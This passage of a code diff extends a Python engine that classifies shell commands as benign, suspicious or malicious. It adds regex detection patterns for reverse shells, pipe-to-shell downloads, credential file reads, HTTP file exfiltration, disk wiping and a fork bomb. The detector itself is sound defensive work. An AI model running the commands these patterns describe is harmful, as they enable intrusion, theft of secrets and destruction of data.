@@ -17,6 +17,19 @@ except ImportError:
     pyminusone = None
 
 
+def _env_flag(name: str, default: bool) -> bool:
+    return os.getenv(name, "1" if default else "0").strip().lower() in {"1", "true", "yes", "on"}
+
+
+benign_conf_threshold = float(os.getenv("GENOS_BENIGN_CONF_THRESHOLD", "0.60"))
+suspicious_conf_threshold = float(os.getenv("GENOS_SUSPICIOUS_CONF_THRESHOLD", "0.55"))
+malicious_conf_threshold = float(os.getenv("GENOS_MALICIOUS_CONF_THRESHOLD", "0.72"))
+low_margin_threshold = float(os.getenv("GENOS_LOW_MARGIN_THRESHOLD", "0.12"))
+specialist_suspicious_conf_threshold = float(os.getenv("GENOS_SPECIALIST_SUSPICIOUS_CONF_THRESHOLD", "0.63"))
+high_risk_override_enabled = _env_flag("GENOS_HIGH_RISK_OVERRIDE_ENABLED", True)
+suspicious_fallback_enabled = _env_flag("GENOS_SUSPICIOUS_FALLBACK_ENABLED", True)
+
+
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 import sys as _sys
@@ -135,6 +148,165 @@ class GenosEngine:
             "Enumerates local or domain account information",
         ],
     }
+
+    _PUBLIC_LABEL_MAP = {
+        "Benign": "Benign",
+        "Malicious": "Malicious",
+        "Context_Dependent": "Suspicious",
+    }
+    _INTERNAL_LABEL_MAP = {value: key for key, value in _PUBLIC_LABEL_MAP.items()}
+
+    _DOWNLOAD_RE = re.compile(
+        r"\b(?:curl|wget|invoke-webrequest|iwr|bitsadmin|certutil(?:\.exe)?|aria2c|fetch)\b",
+        re.I,
+    )
+    _PIPE_TO_SHELL_RE = re.compile(
+        r"(?:curl|wget|invoke-webrequest|iwr|echo|printf).{0,200}\|\s*(?:(?:/bin/)?(?:ba|z)?sh|pwsh?|powershell)\b",
+        re.I | re.S,
+    )
+    _REVERSE_SHELL_RE = re.compile(
+        r"(?:/dev/tcp/|\bnc(?:at)?\b.*(?:-e|-c)\s*/bin/(?:ba)?sh\b|mkfifo\b.*\bnc(?:at)?\b|"
+        r"socket\.socket\(\).*connect\(|tcpsocket\.open\(|fsockopen\(|s_client\b.*\|\s*/bin/(?:ba)?sh\b)",
+        re.I | re.S,
+    )
+    _BASE64_EXEC_RE = re.compile(
+        r"(?:-enc(?:odedcommand)?\s+[A-Za-z0-9+/=]{20,}|frombase64string|base64\s+-d\b|certutil\s+-decode\b)",
+        re.I,
+    )
+    _EVAL_EXEC_RE = re.compile(
+        r"\b(?:eval|iex\b|invoke-expression\b|exec\s*\(|python\d?\s+-c\b|perl\s+-e\b|ruby\s+-e\b|php\s+-r\b|node\s+-e\b)",
+        re.I,
+    )
+    _SHELL_SPAWN_RE = re.compile(
+        r"(?:/bin/(?:ba)?sh\b|cmd(?:\.exe)?\s+/c\b|powershell(?:\.exe)?\b|pwsh\b)",
+        re.I,
+    )
+    _SENSITIVE_FILE_READ_RE = re.compile(
+        r"\b(?:cat|less|more|head|tail|grep|awk|sed|cut|strings|xxd|od|nl|wc|stat|file)\b.*"
+        r"(?:/etc/(?:shadow|sudoers|passwd|group)|/root/\.ssh/|authorized_keys|id_rsa|\.kube/config|"
+        r"/var/log/(?:auth|secure|audit|btmp|wtmp)|/proc/\d+/environ)",
+        re.I,
+    )
+    _NETWORK_ENUM_RE = re.compile(
+        r"^\s*(?:nmap|masscan|zmap|netstat|ss|ifconfig|arp|route|traceroute|tracepath|mtr|dig|nslookup|host)\b"
+        r"|^\s*ip\s+(?:addr|route|neigh|link|rule)\b",
+        re.I,
+    )
+    _PROCESS_ENUM_RE = re.compile(
+        r"^\s*(?:ps|top|pstree|pgrep|pidof|lsof)\b|^\s*docker\s+(?:ps|top|inspect)\b",
+        re.I,
+    )
+    _TUNNELING_RE = re.compile(
+        r"\bssh\b.*\s-[DLR]\s|\bchisel\b|\bsocat\b|\bsshuttle\b|\bfrp[cps]\b|\bnc(?:at)?\b.*\s-l\b",
+        re.I,
+    )
+    _PACKET_CAPTURE_RE = re.compile(r"^\s*(?:tcpdump|tshark|dumpcap|wireshark)\b", re.I)
+    _DEBUG_TRACE_RE = re.compile(r"^\s*(?:strace|ltrace|gdb|perf\s+trace)\b", re.I)
+    _OFFENSIVE_TOOLING_RE = re.compile(
+        r"^\s*(?:nmap|nikto|hydra|sqlmap|masscan|zmap|enum4linux|crackmapexec|responder|"
+        r"impacket-|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|linpeas(?:\.sh)?|pspy\d*|bloodhound-python)\b",
+        re.I,
+    )
+    _PERSISTENCE_RE = re.compile(
+        r"(?:crontab\s+-|echo\s+.*\|\s*crontab\b|schtasks\s+/create\b|currentversion\\run\b|"
+        r"authorized_keys\b.*>>|systemctl\s+enable\b|rc\.local|/etc/cron\.(?:d|daily|hourly|monthly|weekly)|at\s+\d)",
+        re.I,
+    )
+    _PRIVESC_RE = re.compile(
+        r"(?:chmod\s+(?:u\+s|4[0-7]{3})\s+/(?:bin|usr/bin|sbin)|/etc/sudoers\b|useradd\s+.*-u\s+0\b|setcap\s+cap_setuid)",
+        re.I,
+    )
+    _DEFENSE_IMPAIR_RE = re.compile(
+        r"(?:iptables\s+-F\b|ufw\s+disable\b|setenforce\s+0\b|systemctl\s+(?:stop|disable)\s+"
+        r"(?:firewalld|ufw|auditd|sysmon)|auditctl\b.*-e\s+0|sc\s+stop\s+windefend|powershell.*set-mppreference)",
+        re.I,
+    )
+    _DESTRUCTIVE_RE = re.compile(
+        r"(?:\bdd\b.*(?:if=/dev/(?:zero|urandom)).*(?:of=/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*))|"
+        r"\bmkfs(?:\.[a-z0-9_+-]+)?\b\s+/dev/|\brm\s+-rf\s+/+\b|shred\b.*\s+/dev/)",
+        re.I,
+    )
+    _ARCHIVE_BULK_RE = re.compile(
+        r"^\s*(?:tar|zip|7z|rar|rsync|cp)\b.*(?:/etc|/var/log|/home|/opt|/srv)|^\s*find\b.*(?:/etc|/var/log|/home).*(?:-name|-type)",
+        re.I,
+    )
+    _REMOTE_TRANSFER_RE = re.compile(
+        r"^\s*(?:scp|sftp|ftp|rsync)\b.*[@:][^ ]+|^\s*(?:curl|wget)\b.*(?:--upload-file|-T|--data-binary\s+@|--form\s+@|-d\s+@)",
+        re.I,
+    )
+    _SERVICE_INSPECTION_RE = re.compile(
+        r"^\s*(?:systemctl\s+(?:status|list-units|list-unit-files|is-active|is-enabled)|service\s+--status-all|"
+        r"journalctl\s+-u|docker\s+(?:ps|info|images)|kubectl\s+(?:get|describe|cluster-info|top)|"
+        r"(?:mount|lsblk|blkid|findmnt|df)\b)",
+        re.I,
+    )
+    _LOCAL_ARTIFACT_INSPECTION_RE = re.compile(
+        r"^\s*(?:md5sum|sha(?:1|224|256|384|512)?sum|file)\b.*(?:"
+        r"/(?:tmp|var/tmp|var/backups|srv/(?:builds|releases|artifacts|snapshots)|opt/(?:artifacts|builds)|home/[^\s]+/(?:downloads|builds))/|"
+        r"\.(?:tar(?:\.gz)?|tgz|zip|deb|rpm|asc|xml|pem|crt|log|txt|csv|bak)\b)",
+        re.I,
+    )
+    _BENIGN_SNAPSHOT_SOURCE_RE = re.compile(
+        r"(?:/var/log(?:/[^\s]*)?|/etc/(?:nginx|ssh|ssl/certs|systemd/system)|/srv/(?:app(?:/current|/config)?|releases)|"
+        r"/home/[^\s]+/(?:builds|\.config)|/tmp/(?:release|backup|snapshot|artifact)|/opt/(?:artifacts|builds))",
+        re.I,
+    )
+    _BENIGN_ARCHIVE_PATH_RE = re.compile(
+        r"^\s*(?:tar\s+(?:tzf|-xzf|czf)\b|zip\b)",
+        re.I,
+    )
+    _CONTROLLED_REMOTE_TARGET_RE = re.compile(
+        r"(?:\b(?:backup|audit|ops|deploy|support|infra)@(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.|[a-z0-9.-]*internal\b|[a-z0-9.-]*company\.local\b)|"
+        r":/srv/(?:backup|backups|audit|snapshots|incident|review|notes|staging|forensics)\b)",
+        re.I,
+    )
+    _CONTROLLED_REMOTE_COPY_RE = re.compile(
+        r"^\s*(?:scp|rsync)\b",
+        re.I,
+    )
+    _OPENSSL_CLIENT_INSPECTION_RE = re.compile(
+        r"^\s*openssl\s+s_client\b.*(?:-connect|-starttls|-servername|-showcerts)\b",
+        re.I,
+    )
+    _ROUTINE_SERVICE_LOG_RE = re.compile(
+        r"^\s*(?:journalctl\b|systemctl\s+(?:status|cat|reload|restart|daemon-reload)\b|docker\s+(?:logs|inspect|stats)\b|kubectl\s+(?:logs|describe|rollout|top|get\s+events)\b)",
+        re.I,
+    )
+    _CONTAINER_ADMIN_READONLY_RE = re.compile(
+        r"^\s*(?:docker\s+exec|kubectl\s+exec|kubectl\s+cp)\b.*(?:"
+        r"\b(?:env|printenv|ls|find|tar|cat)\b|/var/log|/etc/ssl|/app/config|\.log\b)",
+        re.I,
+    )
+    _SENSITIVE_SOURCE_RE = re.compile(
+        r"(?:/etc/(?:shadow|sudoers)|/root/\.ssh|authorized_keys\b|id_rsa\b|/etc/kubernetes|/var/lib/kubelet|"
+        r"/opt/secrets|/var/lib/postgresql|/app/\.env|serviceaccount/token|/etc/pam\.d)",
+        re.I,
+    )
+    _EXPLOIT_OR_ATTACK_TOOLING_RE = re.compile(
+        r"^\s*(?:hydra|sqlmap|nikto|msfconsole|mimikatz(?:\.exe)?|john\b|hashcat\b|responder\b|ettercap\b|arpspoof\b|"
+        r"crackmapexec\b|impacket-|metasploit\b|secretsdump\b)",
+        re.I,
+    )
+    _BENIGN_ADMIN_WORKFLOW_RE = re.compile(
+        r"^(?:\s*(?:mount\b.*grep|ip\s+(?:addr|route|link|neigh)\b|ss\b|netstat\b|arp\b|route\b|ps\b|top\s+-b|du\b|ls\b|"
+        r"find\s+/(?:tmp|var/log|etc|opt|srv|usr/local/bin|home(?:/[^\s]+)?)\b.*(?:-maxdepth|-type|-mtime)|env\s*\|\s*grep\s+path|history\b|"
+        r"file\b|stat\b|head\b|wc\b|md5sum\b|sha(?:1|224|256|384|512)?sum\b|journalctl\b|systemctl\s+(?:status|is-active|is-enabled|"
+        r"reload|restart|cat|daemon-reload)\b|docker\s+(?:ps|logs|inspect|stats|exec)\b|kubectl\s+(?:get|logs|describe|rollout|cp|top)\b|"
+        r"pip\s+list\b|dpkg\s+-l\b|tar\s+(?:tzf|-xzf|czf)\b|zip\b|rsync\b|scp\b|curl\s+-f?s?S?L?\b.*(?:-o|>)|wget\b.*(?:-o|-O)\b|"
+        r"openssl\s+(?:x509|rsa|s_client)\b|python3?\s+-m\s+http\.server\b|gdb\b|strace\b|ltrace\b))",
+        re.I,
+    )
+    _CREDENTIAL_DUMP_RE = re.compile(
+        r"(?:/etc/shadow\b|mimikatz|sekurlsa|hashdump|lsass|sam hive|unshadow\b|john\b.*rockyou|secretsdump)",
+        re.I,
+    )
+    _SIMPLE_OPERATIONAL_BENIGN_PATTERNS = (
+        re.compile(r"^\s*(?:pwd|date|uptime|whoami|id(?:\s|$)|hostname(?:\s|$)|uname(?:\s|$)|echo\b|printf\b|true\b|false\b|alias\b)", re.I),
+        re.compile(r"^\s*(?:df|free|lsblk|blkid|findmnt)\b", re.I),
+        re.compile(r"^\s*cat\s+/(?:etc/(?:hostname|os-release|issue(?:\.net)?|debian_version|redhat-release)|proc/(?:version|cpuinfo|meminfo))\b", re.I),
+        re.compile(r"^\s*(?:git\s+log\b|docker\s+ps\b|systemctl\s+status\b|journalctl\s+-u\b)", re.I),
+    )
+    _BENIGN_TOLERATED_FEATURES = frozenset({"has_service_or_system_inspection"})
 
     def __init__(
         self,
@@ -980,30 +1152,358 @@ class GenosEngine:
     # Class indices: 0=Benign, 1=Malicious, 2=Context_Dependent
     _GATE_LABELS = ["Benign", "Malicious", "Context_Dependent"]
 
-    def _tier1_decision(self, probs: torch.Tensor):
+    def _summarize_gate_probs(self, probs: torch.Tensor) -> dict:
         probs = probs.squeeze(0)
         benign_prob = float(probs[0].item())
         malicious_prob = float(probs[1].item())
         ctx_prob = float(probs[2].item()) if probs.size(0) > 2 else 0.0
-
-        predicted_idx = int(probs.argmax().item())
+        top_vals, top_idxs = torch.topk(probs, k=min(2, probs.size(0)), largest=True, sorted=True)
+        predicted_idx = int(top_idxs[0].item())
+        second_idx = int(top_idxs[1].item()) if len(top_idxs) > 1 else predicted_idx
         label = self._GATE_LABELS[predicted_idx]
-        label_conf = float(probs[predicted_idx].item())
-
-        is_malicious = label == "Malicious"
-        is_context_dependent = label == "Context_Dependent"
-
+        second_label = self._GATE_LABELS[second_idx]
+        label_conf = float(top_vals[0].item())
+        second_conf = float(top_vals[1].item()) if len(top_vals) > 1 else 0.0
         return {
-            "is_malicious": is_malicious,
-            "is_context_dependent": is_context_dependent,
             "label": label,
+            "public_label": self._PUBLIC_LABEL_MAP[label],
+            "second_label": second_label,
+            "second_public_label": self._PUBLIC_LABEL_MAP[second_label],
             "benign_prob": benign_prob,
             "malicious_prob": malicious_prob,
             "ctx_prob": ctx_prob,
             "label_conf": label_conf,
-            "decision_mode": "argmax",
-            "threshold_used": None,
+            "second_conf": second_conf,
+            "decision_margin": max(0.0, label_conf - second_conf),
+            "class_probabilities": {
+                "Benign": benign_prob,
+                "Suspicious": ctx_prob,
+                "Malicious": malicious_prob,
+            },
+            "decision_mode": "model_probs",
         }
+
+    def _select_gate_summary(self, primary_probs: torch.Tensor, raw_probs: torch.Tensor | None = None) -> dict:
+        primary = self._summarize_gate_probs(primary_probs)
+        primary["model_view"] = "deobfuscated"
+        if raw_probs is None:
+            return primary
+
+        raw_summary = self._summarize_gate_probs(raw_probs)
+        raw_summary["model_view"] = "raw"
+
+        primary_risk = primary["class_probabilities"]["Malicious"] + (0.55 * primary["class_probabilities"]["Suspicious"])
+        raw_risk = raw_summary["class_probabilities"]["Malicious"] + (0.55 * raw_summary["class_probabilities"]["Suspicious"])
+        chosen = raw_summary if raw_risk > primary_risk + 0.03 else primary
+        chosen["alternate_view"] = raw_summary if chosen is primary else primary
+        return chosen
+
+    def _matches_any(self, text_views: list[str], pattern: re.Pattern) -> bool:
+        return any(pattern.search(view) for view in text_views if view)
+
+    def _is_simple_operational_benign(self, text_views: list[str]) -> bool:
+        return any(self._matches_any(text_views, pattern) for pattern in self._SIMPLE_OPERATIONAL_BENIGN_PATTERNS)
+
+    def _extract_routing_features(self, raw_cmd: str, deobfuscated_cmd: str | None = None) -> dict:
+        text_views = []
+        for candidate in (raw_cmd, deobfuscated_cmd):
+            if candidate:
+                normalized = candidate.lower().strip()
+                if normalized and normalized not in text_views:
+                    text_views.append(normalized)
+
+        features = {
+            "has_download": self._matches_any(text_views, self._DOWNLOAD_RE),
+            "has_pipe_to_shell": self._matches_any(text_views, self._PIPE_TO_SHELL_RE),
+            "has_reverse_shell_pattern": self._matches_any(text_views, self._REVERSE_SHELL_RE),
+            "has_base64_or_encoded_exec": self._matches_any(text_views, self._BASE64_EXEC_RE),
+            "has_eval_exec": self._matches_any(text_views, self._EVAL_EXEC_RE),
+            "has_shell_spawn": self._matches_any(text_views, self._SHELL_SPAWN_RE),
+            "has_sensitive_file_read": self._matches_any(text_views, self._SENSITIVE_FILE_READ_RE),
+            "has_network_enum": self._matches_any(text_views, self._NETWORK_ENUM_RE),
+            "has_process_enum": self._matches_any(text_views, self._PROCESS_ENUM_RE),
+            "has_tunneling": self._matches_any(text_views, self._TUNNELING_RE),
+            "has_packet_capture": self._matches_any(text_views, self._PACKET_CAPTURE_RE),
+            "has_debug_trace": self._matches_any(text_views, self._DEBUG_TRACE_RE),
+            "has_offensive_tooling": self._matches_any(text_views, self._OFFENSIVE_TOOLING_RE),
+            "has_persistence_change": self._matches_any(text_views, self._PERSISTENCE_RE),
+            "has_privilege_escalation": self._matches_any(text_views, self._PRIVESC_RE),
+            "has_defense_impairment": self._matches_any(text_views, self._DEFENSE_IMPAIR_RE),
+            "has_destructive_write": self._matches_any(text_views, self._DESTRUCTIVE_RE),
+            "has_archive_or_bulk_copy": self._matches_any(text_views, self._ARCHIVE_BULK_RE),
+            "has_remote_transfer": self._matches_any(text_views, self._REMOTE_TRANSFER_RE),
+            "has_service_or_system_inspection": self._matches_any(text_views, self._SERVICE_INSPECTION_RE),
+            "has_credential_dumping_pattern": self._matches_any(text_views, self._CREDENTIAL_DUMP_RE),
+            "has_simple_benign_check": self._is_simple_operational_benign(text_views),
+            "has_sensitive_source": self._matches_any(text_views, self._SENSITIVE_SOURCE_RE),
+            "has_exploit_or_attack_tooling": self._matches_any(text_views, self._EXPLOIT_OR_ATTACK_TOOLING_RE),
+            "has_benign_admin_workflow": self._matches_any(text_views, self._BENIGN_ADMIN_WORKFLOW_RE),
+            "has_local_artifact_inspection": self._matches_any(text_views, self._LOCAL_ARTIFACT_INSPECTION_RE),
+            "has_benign_snapshot_source": self._matches_any(text_views, self._BENIGN_SNAPSHOT_SOURCE_RE),
+            "has_benign_archive_command": self._matches_any(text_views, self._BENIGN_ARCHIVE_PATH_RE),
+            "has_controlled_remote_target": self._matches_any(text_views, self._CONTROLLED_REMOTE_TARGET_RE),
+            "has_controlled_remote_copy": self._matches_any(text_views, self._CONTROLLED_REMOTE_COPY_RE),
+            "has_openssl_client_inspection": self._matches_any(text_views, self._OPENSSL_CLIENT_INSPECTION_RE),
+            "has_routine_service_log_inspection": self._matches_any(text_views, self._ROUTINE_SERVICE_LOG_RE),
+            "has_container_readonly_admin": self._matches_any(text_views, self._CONTAINER_ADMIN_READONLY_RE),
+        }
+        return features
+
+    def _label_threshold(self, public_label: str) -> float:
+        if public_label == "Benign":
+            return benign_conf_threshold
+        if public_label == "Malicious":
+            return malicious_conf_threshold
+        return suspicious_conf_threshold
+
+    def _triggered_features(self, features: dict) -> list[str]:
+        return sorted(name for name, value in features.items() if value)
+
+    def _build_route_result(
+        self,
+        label: str,
+        label_confidence: float,
+        reason: str,
+        policy: str,
+        features: dict,
+        should_run_specialist: bool,
+    ) -> dict:
+        return {
+            "label": self._INTERNAL_LABEL_MAP[label],
+            "label_confidence": label_confidence,
+            "reason": reason,
+            "routing_policy": policy,
+            "triggered_features": self._triggered_features(features),
+            "should_run_specialist": should_run_specialist,
+        }
+
+    def _malicious_promotion_features(self, features: dict) -> tuple[list[str], list[str]]:
+        forced_malicious_features = [
+            name for name in (
+                "has_pipe_to_shell",
+                "has_reverse_shell_pattern",
+                "has_persistence_change",
+                "has_privilege_escalation",
+                "has_defense_impairment",
+                "has_destructive_write",
+                "has_credential_dumping_pattern",
+            )
+            if features.get(name)
+        ]
+
+        malicious_promotion_features = list(forced_malicious_features)
+        if features.get("has_exploit_or_attack_tooling"):
+            malicious_promotion_features.append("has_exploit_or_attack_tooling")
+        if features.get("has_remote_transfer") and features.get("has_sensitive_source"):
+            malicious_promotion_features.append("remote_transfer_sensitive_source")
+        if features.get("has_archive_or_bulk_copy") and features.get("has_sensitive_source"):
+            malicious_promotion_features.append("archive_sensitive_source")
+        if features.get("has_download") and (
+            features.get("has_eval_exec")
+            or features.get("has_shell_spawn")
+            or features.get("has_base64_or_encoded_exec")
+        ):
+            malicious_promotion_features.append("download_exec_chain")
+
+        return forced_malicious_features, malicious_promotion_features
+
+    def _suspicious_signals(self, features: dict) -> list[str]:
+        return [
+            name for name in (
+                "has_tunneling",
+                "has_packet_capture",
+                "has_debug_trace",
+                "has_offensive_tooling",
+                "has_sensitive_file_read",
+                "has_archive_or_bulk_copy",
+                "has_remote_transfer",
+                "has_eval_exec",
+                "has_download",
+                "has_base64_or_encoded_exec",
+                "has_shell_spawn",
+            )
+            if features.get(name)
+        ]
+
+    def _benign_safe_override(
+        self,
+        class_probs: dict,
+        margin: float,
+        features: dict,
+        forced_malicious_features: list[str],
+    ) -> dict | None:
+        triggered = set(self._triggered_features(features))
+        allowed_benign_features = {
+            "has_simple_benign_check",
+            "has_benign_admin_workflow",
+            "has_service_or_system_inspection",
+            "has_local_artifact_inspection",
+            "has_benign_snapshot_source",
+            "has_benign_archive_command",
+            "has_controlled_remote_target",
+            "has_controlled_remote_copy",
+            "has_openssl_client_inspection",
+            "has_routine_service_log_inspection",
+            "has_container_readonly_admin",
+        }
+        disallowed_benign_features = triggered - allowed_benign_features
+
+        if (
+            features.get("has_simple_benign_check")
+            and not disallowed_benign_features
+            and not forced_malicious_features
+        ):
+            return self._build_route_result(
+                label="Benign",
+                label_confidence=max(class_probs["Benign"], 0.78 if margin >= low_margin_threshold else 0.72),
+                reason="Simple operational or health-check command with no strong security-risk features.",
+                policy="benign_operational_override",
+                features=features,
+                should_run_specialist=False,
+            )
+
+        high_precision_benign = (
+            features.get("has_local_artifact_inspection")
+            or features.get("has_openssl_client_inspection")
+            or features.get("has_routine_service_log_inspection")
+            or features.get("has_container_readonly_admin")
+            or (
+                features.get("has_benign_archive_command")
+                and features.get("has_benign_snapshot_source")
+                and not features.get("has_sensitive_source")
+            )
+            or (
+                features.get("has_controlled_remote_copy")
+                and features.get("has_controlled_remote_target")
+                and features.get("has_benign_snapshot_source")
+                and not features.get("has_sensitive_source")
+            )
+        )
+
+        if (
+            high_precision_benign
+            and not disallowed_benign_features
+            and not forced_malicious_features
+            and class_probs["Malicious"] < 0.52
+        ):
+            return self._build_route_result(
+                label="Benign",
+                label_confidence=max(class_probs["Benign"], 0.72),
+                reason="High-precision operational admin workflow without attack-oriented indicators.",
+                policy="benign_high_precision_override",
+                features=features,
+                should_run_specialist=False,
+            )
+
+        return None
+
+    def _route_gatekeeper(self, gate: dict, features: dict, raw_cmd: str, deobfuscated_cmd: str | None = None) -> dict:
+        hard_override = self._check_hard_overrides(raw_cmd, deobfuscated_cmd)
+        class_probs = gate["class_probabilities"]
+        top_label = gate["public_label"]
+        top_conf = gate["label_conf"]
+        margin = gate["decision_margin"]
+        weak_prediction = top_conf < self._label_threshold(top_label) or margin < low_margin_threshold
+        forced_malicious_features, malicious_promotion_features = self._malicious_promotion_features(features)
+        suspicious_signals = self._suspicious_signals(features)
+        high_risk = bool(hard_override or malicious_promotion_features)
+
+        if high_risk_override_enabled and hard_override:
+            return self._build_route_result(
+                label="Suspicious" if hard_override["tag"] == "credential_file_read" and "/etc/passwd" in raw_cmd.lower() else "Malicious",
+                label_confidence=max(class_probs["Malicious"], hard_override["confidence"]),
+                reason=f"Forced malicious by deterministic high-risk pattern: {hard_override['tag']}",
+                policy="hard_override",
+                features=features,
+                should_run_specialist=True,
+            )
+
+        if high_risk_override_enabled and malicious_promotion_features:
+            return self._build_route_result(
+                label="Malicious",
+                label_confidence=max(class_probs["Malicious"], 0.86),
+                reason="Forced malicious by high-risk behavior: " + ", ".join(malicious_promotion_features[:3]),
+                policy="feature_force_malicious",
+                features=features,
+                should_run_specialist=True,
+            )
+
+        benign_override = self._benign_safe_override(
+            class_probs=class_probs,
+            margin=margin,
+            features=features,
+            forced_malicious_features=forced_malicious_features,
+        )
+        if benign_override is not None:
+            return benign_override
+
+        if top_label == "Malicious" and (features.get("has_exploit_or_attack_tooling") or features.get("has_sensitive_source")):
+            final_label = "Malicious"
+            reason = "Model and attack-oriented tooling or sensitive-source handling both indicate malicious activity."
+            policy = "model_malicious_attack_tooling"
+        elif top_label == "Malicious" and not weak_prediction:
+            final_label = "Malicious"
+            reason = "Model strongly favors Malicious with a clear confidence margin."
+            policy = "model_aligned_malicious"
+        elif features.get("has_sensitive_source") and top_label != "Malicious":
+            final_label = "Suspicious"
+            reason = "Sensitive-source access without a strong malicious verdict is routed to Suspicious for review."
+            policy = "suspicious_sensitive_source_guardrail"
+        elif top_label == "Benign" and suspicious_signals and (weak_prediction or len(suspicious_signals) >= 2):
+            final_label = "Suspicious"
+            reason = "Benign model prediction is softened by dual-use security signals: " + ", ".join(suspicious_signals[:3])
+            policy = "suspicious_dual_use_guardrail"
+        elif top_label == "Malicious" and suspicious_fallback_enabled and weak_prediction and not malicious_promotion_features:
+            final_label = "Suspicious"
+            reason = "Malicious model prediction was weak or low-margin without a strong attack-chain feature, so it falls back to Suspicious."
+            policy = "suspicious_low_margin_fallback"
+        elif top_label == "Suspicious":
+            final_label = "Suspicious"
+            reason = "Model routes this command to Suspicious because the behavior remains dual-use or context dependent."
+            policy = "model_aligned_suspicious"
+        elif top_label == "Benign" and not weak_prediction:
+            final_label = "Benign"
+            if suspicious_signals:
+                reason = "Model still favors Benign with sufficient confidence despite limited dual-use indicators."
+                policy = "model_benign_with_caution"
+            else:
+                reason = "Model strongly favors Benign and no security-significant features were detected."
+                policy = "model_aligned_benign"
+        elif suspicious_fallback_enabled:
+            final_label = "Suspicious"
+            reason = "Model confidence was weak or ambiguous, so the command is routed to Suspicious for safer handling."
+            policy = "suspicious_confidence_fallback"
+        else:
+            final_label = top_label
+            reason = f"Using raw model top class {top_label}."
+            policy = "model_top_class"
+
+        specialist = False
+        if final_label == "Malicious":
+            specialist = True
+        elif final_label == "Suspicious":
+            specialist = (
+                class_probs["Suspicious"] >= specialist_suspicious_conf_threshold
+                or high_risk
+                or features.get("has_offensive_tooling")
+                or len(suspicious_signals) >= 2
+            )
+
+        confidence_floor = {
+            "Benign": 0.68,
+            "Suspicious": 0.64,
+            "Malicious": 0.74,
+        }[final_label]
+        label_confidence = max(class_probs[final_label], confidence_floor if policy != "model_top_class" else class_probs[final_label])
+
+        return self._build_route_result(
+            label=final_label,
+            label_confidence=label_confidence,
+            reason=reason,
+            policy=policy,
+            features=features,
+            should_run_specialist=specialist,
+        )
 
     # ── Hard-override patterns (unambiguously malicious, bypass gatekeeper) ──
 
@@ -1026,16 +1526,66 @@ class GenosEngine:
         (re.compile(
             r"\bnc(?:at)?\b.*-e\s*/bin/(?:ba)?sh\b", re.I,
         ), "reverse_shell_nc", 0.98),
-        # Credential harvesting – reading shadow / passwd
+        # Credential harvesting – direct reads of highly sensitive files
         (re.compile(
-            r"\b(?:cat|less|more|head|tail|tac|nl|xxd|strings)\s+/etc/(?:shadow|passwd|sudoers)\b",
+            r"\b(?:cat|less|more|head|tail|tac|nl|xxd|strings)\s+/etc/(?:shadow|sudoers)\b",
             re.I,
         ), "credential_file_read", 0.95),
         # mkfifo reverse shell
         (re.compile(
             r"mkfifo\s+.*\bnc(?:at)?\b.*(?:ba)?sh\b", re.I | re.S,
         ), "reverse_shell_mkfifo", 0.98),
+        # Disk destruction / filesystem wipe
+        (re.compile(
+            r"\bdd\b.*(?:if=/dev/(?:zero|urandom|null)).*(?:of=/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*))",
+            re.I,
+        ), "disk_destruction_dd", 0.99),
+        (re.compile(
+            r"\bmkfs(?:\.[a-z0-9_+-]+)?\b\s+/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*)",
+            re.I,
+        ), "filesystem_format", 0.99),
+        # Exfiltration of local file content via HTTP upload
+        (re.compile(
+            r"\bcurl\b.*(?:-x\s+post|-xpost|--request\s+post|--request=post|\bpost\b).*(?:-d\s+@|--data\s+@|--data-binary\s+@|--form\s+@|--form-string\s+@)\s*/",
+            re.I,
+        ), "http_file_exfiltration", 0.97),
+        # Additional reverse shell variants missed by the gatekeeper
+        (re.compile(
+            r"\bruby\b.*tcpsocket\.open\([^)]*\).*exec\s+sprintf\([^)]*/bin/(?:ba)?sh",
+            re.I,
+        ), "reverse_shell_ruby", 0.98),
+        (re.compile(
+            r"\bopenssl\s+s_client\b.*\|\s*/bin/(?:ba)?sh\b",
+            re.I,
+        ), "reverse_shell_openssl", 0.98),
+        (re.compile(
+            r":\(\)\s*\{\s*:\|:&\s*\};:",
+            re.I,
+        ), "fork_bomb", 0.99),
     ]
+
+    def _apply_routing_override(self, gate: dict, label: str, confidence: float, mode: str) -> None:
+        confidence = max(0.0, min(1.0, confidence))
+        remainder = max(0.0, 1.0 - confidence)
+        other = remainder / 2.0
+        gate["benign_prob"] = other
+        gate["malicious_prob"] = other
+        gate["ctx_prob"] = other
+        if label == "Benign":
+            gate["benign_prob"] = confidence
+            gate["is_malicious"] = False
+            gate["is_context_dependent"] = False
+        elif label == "Malicious":
+            gate["malicious_prob"] = confidence
+            gate["is_malicious"] = True
+            gate["is_context_dependent"] = False
+        else:
+            gate["ctx_prob"] = confidence
+            gate["is_malicious"] = False
+            gate["is_context_dependent"] = True
+        gate["label"] = label
+        gate["label_conf"] = confidence
+        gate["decision_mode"] = mode
 
     def _check_hard_overrides(self, raw_cmd, deobfuscated_cmd):
         """Return an override dict if a deterministic pattern matches, else None."""
@@ -1094,54 +1644,76 @@ class GenosEngine:
 
         with torch.no_grad():
             with autocast(device_type=device_type, dtype=autocast_dtype):
-                # Run gatekeeper on the deobfuscated command
                 g_logits = self.t1(inputs["input_ids"], inputs["attention_mask"])
                 g_probs = F.softmax(g_logits, dim=1)
-                gate = self._tier1_decision(g_probs)
+                raw_g_probs = None
 
-                # If deobfuscated, also score the raw command and keep the
-                # higher malicious probability (worst-case of both views).
                 if raw_inputs is not None:
                     raw_g_logits = self.t1(raw_inputs["input_ids"], raw_inputs["attention_mask"])
                     raw_g_probs = F.softmax(raw_g_logits, dim=1)
-                    raw_gate = self._tier1_decision(raw_g_probs)
-                    if raw_gate["malicious_prob"] > gate["malicious_prob"]:
-                        gate = raw_gate
 
-                # Hard-override: catch unambiguously malicious patterns the
-                # gatekeeper may under-score (e.g. base64→sh, reverse shells).
-                if not gate["is_malicious"]:
-                    _ho = self._check_hard_overrides(raw_cmd, current_cmd if was_obfuscated else None)
-                    if _ho:
-                        gate["is_malicious"] = True
-                        gate["is_context_dependent"] = False
-                        gate["label"] = "Malicious"
-                        gate["label_conf"] = max(gate["malicious_prob"], _ho["confidence"])
-                        gate["decision_mode"] = f"rule_override:{_ho['tag']}"
